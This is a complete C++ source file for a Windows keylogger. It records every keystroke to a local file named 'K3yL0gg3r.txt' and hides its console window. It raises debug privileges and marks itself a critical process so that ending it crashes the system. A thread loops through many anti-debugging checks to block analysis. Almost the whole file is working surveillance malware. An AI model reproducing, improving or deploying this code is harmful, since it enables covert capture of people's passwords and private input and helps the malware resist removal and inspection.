#include "AntiDBG.h"
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <thread>

/*
Create By Anas hadane
Github : https://github.com/ZeroM3m0ry
*/
using namespace std;

void flog(string g);
bool Otg(int key)
{
	switch (key) {
	case VK_SPACE:
		flog("\t");
		return true;
	case VK_RETURN:
		flog("\n");
		return true;

	case VK_F1:
		flog("#F1#");
		return true;
	case VK_F2:
		flog("#F2#");
		return true;
	case VK_F3:
		flog("#F3#");
		return true;
	case VK_F4:
		flog("#F4#");
		return true;
	case VK_F5:
		flog("#F5#");
		return true;

	case VK_SHIFT:
		flog("#SHIFT");
		return true;
	case VK_BACK:
		flog("\b");
		return true;
	case VK_RBUTTON:
		flog(" ");
		return true;
	case VK_CAPITAL:
		flog(" #CAPS_LOCK_ON#");
		return true;
	case VK_TAB:
		flog("#TAB");
		return true;
	case VK_UP:
		flog("#UP_ARROW_KEY#");
		return true;
	case VK_CONTROL:
		flog("#CONTROL#");
		return true;
	case VK_MENU:
		flog("#ALT#");
	default:
		return false;
	}
}



typedef long(WINAPI* RtlSetProcessIsCritical)(
	IN BOOLEAN NewSettings,
	OUT BOOLEAN OldSettings,
	IN BOOLEAN CriticalStop
	);

BOOL SetPrivilege(BOOL bEnablePrivilege);

void Skinjbir() {
	RtlSetProcessIsCritical CallAPI;
	CallAPI = (RtlSetProcessIsCritical)GetProcAddress(LoadLibraryA("NTDLL.dll"), "RtlSetProcessIsCritical");

	if (SetPrivilege(TRUE) && CallAPI != NULL) {
		CallAPI(TRUE, FALSE, FALSE);
		std::cout << "Done Successfully :)";
	}
	system("pause");
}

BOOL SetPrivilege(BOOL bEnablePrivilege) {
	HANDLE Proc, hTocken;
	Proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
	if (!OpenProcessToken(Proc, TOKEN_ALL_ACCESS, &hTocken)) return false;

	TOKEN_PRIVILEGES tp;
	LUID luid;
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))  return  FALSE;
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	if (!AdjustTokenPrivileges(hTocken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
		return FALSE;

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) return FALSE;
	return TRUE;

}

void  checker()
{
	while (true)
	{
		adbg_IsDebuggerPresent();
		adbg_BeingDebuggedPEB();
		adbg_NtGlobalFlagPEB();
		adbg_CheckRemoteDebuggerPresent();
		adbg_NtQueryInformationProcess();
		adbg_CheckWindowClassName();
		adbg_NtSetInformationThread();
		adbg_HardwareDebugRegisters();
		adbg_MovSS();
		adbg_RDTSC();
		adbg_QueryPerformanceCounter();
		adbg_GetTickCount();
		adbg_CloseHandleException();
		adbg_SingleStepException();
		adbg_Int3();
		adbg_Int2D();
		adbg_PrefixHop();
	}
}




int main()
{
	std::thread check(checker);
	std::thread skinjbire(Skinjbir);

	ShowWindow(GetConsoleWindow(), SW_HIDE);

	while (true) {
		Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
				if (Otg(KEY) == false) {

					fstream LogFile;
					LogFile.open("K3yL0gg3r.txt", fstream::app);
					if (LogFile.is_open()) {
						LogFile << char(KEY);
						LogFile.close();
					}

				}

			}
		}
	}
	skinjbire.join();
	check.join();
}

void flog(string g)
{
	fstream Keylogger;
	Keylogger.open("K3yL0gg3r.txt", fstream::app);
	if (Keylogger.is_open()) {
		Keylogger << g;
		Keylogger.close();
	}
}
